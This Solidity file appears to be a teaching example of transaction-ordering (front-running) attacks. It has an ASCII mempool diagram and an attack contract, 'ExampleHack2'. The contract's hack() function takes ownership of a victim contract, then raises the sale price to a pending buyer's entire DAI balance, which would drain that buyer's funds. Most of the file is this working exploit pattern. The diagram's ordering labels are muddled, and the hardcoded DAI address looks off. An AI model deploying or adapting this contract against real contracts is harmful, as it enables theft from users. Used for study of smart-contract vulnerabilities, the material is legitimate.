// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
  * +-------------------------------------+            +------------------------------------+
  * | Alice submits TX1 with Gas price GP1|            | Bob submits TX2 with Gas price GP2 |
  * | at t1                               |            | at t2                               |
  * +-------------------------------------+            +------------------------------------+
  *             |                                                  |
  *             |                                                  |
  *             v                                                  v
  * +--------------------------------------------------------------------------------------+
  * |                                      Mempool                                         |
  * +--------------------------------------------------------------------------------------+
  *                                      /            \
  *                                     /              \
  *                         GP1 < GP2, t1 < t2          |
  *                                    /                |
  *                                   v                 v
  *                +---------------------------+      +--------------------------------+
  *                | miner / validator         |      | miner / validator              |
  *                +---------------------------+      +--------------------------------+
  *                               |                                     |
  *                               |                                     |
  *                               v                                     v
  *                 +------------------------+                +-----------------------+
  *                 | Block (n-1)            |                | Block (n)             |
  *                 | TX2 has priority over  |                |                       |
  *                 | TX1                    |                |                       |
  *                 +------------------------+                +-----------------------+
  * 
 */

interface IVICTIM {
    function s_price ()                   external returns (uint256);
    function setPrice(uint256 p_price)    external;
    function buy     (address p_newOwner) external;
}

contract ExampleHack2 {
    address hacker;
    address VICTIM_ADDRESS;
    address DAI_ADDRESS = 0x6B17574E89894C44Da98b954EedeAC495271d0F;

    constructor(address p_victim_address) {
        hacker = msg.sender;
        VICTIM_ADDRESS = p_victim_address;
    }

    function hack(address p_buyer) public {
        require(msg.sender == hacker, "ERROR.");

        IVICTIM(VICTIM_ADDRESS).buy(hacker);

        uint256 allBalanceBuyer = IERC20(DAI_ADDRESS).balanceOf(p_buyer);
        IVICTIM(VICTIM_ADDRESS).setPrice(allBalanceBuyer);
    }
}